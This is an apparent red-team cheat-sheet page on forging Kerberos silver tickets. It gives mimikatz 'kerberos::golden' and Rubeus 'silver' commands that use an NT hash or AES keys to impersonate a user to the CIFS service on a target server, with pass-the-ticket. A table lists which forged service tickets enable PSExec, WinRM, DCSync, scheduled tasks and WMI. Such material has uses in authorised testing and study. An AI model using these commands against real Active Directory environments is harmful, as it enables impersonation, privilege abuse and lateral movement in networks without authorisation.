---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/steal-or-forge-kerberos-tickets/silver-ticket
---

# Silver Ticket

```powershell
# mimikatz
kerberos::golden /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /rc4:NThash /user:$impersonate_user /target:SRV01.vulnableone.local /service:CIFS /ptt

kerberos::golden /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /aes128:AES128_key /user:$impersonate_user /service:CIFS /target:SRV01.vulnableone.local /ptt

kerberos::golden /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /aes256:AES256_key /user:$impersonate_user /target:CIFS /target:SRV01.vulnableone.local /service:CIFS /ptt

# Rubeus
Rubeus.exe silver /service:cifs/SRV01.vulnableone.local /aes256:AES256_Key /user:$impersonate_user /domain:vulnablone.local /sid:S-1-5-21-709665108-487177485-3575070505 /ptt /nowrap
```



<table data-view="cards"><thead><tr><th>Technique</th><th>Required Service Tickets</th></tr></thead><tbody><tr><td>PSExec</td><td>CIFS</td></tr><tr><td>winrm</td><td>HOST &#x26; HTTP</td></tr><tr><td>dcsync (DCs only)</td><td>LDAP</td></tr><tr><td>Schtasks</td><td>HOST </td></tr><tr><td>WMI interactions</td><td>HOST &#x26; RPCSS</td></tr></tbody></table>
